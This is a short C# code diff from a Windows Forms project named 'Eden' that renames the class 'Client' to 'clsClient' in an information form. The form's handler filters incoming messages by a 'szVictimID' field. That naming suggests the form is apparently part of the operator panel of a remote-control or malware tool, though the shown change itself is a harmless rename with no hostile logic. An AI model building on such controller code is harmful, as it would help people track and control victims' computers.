@@ -13,7 +13,7 @@ namespace Eden
 {
     public partial class frmInformation : Form
     {
-        public Client m_clnt;
+        public clsClient m_clnt;
         public string szVictimID;
 
         public frmInformation()
@@ -21,7 +21,7 @@ namespace Eden
             InitializeComponent();
         }
 
-        void Received(Client clnt, string szVictimID, string[] aMsg)
+        void Received(clsClient clnt, string szVictimID, string[] aMsg)
         {
             if (szVictimID != this.szVictimID)
                 return;
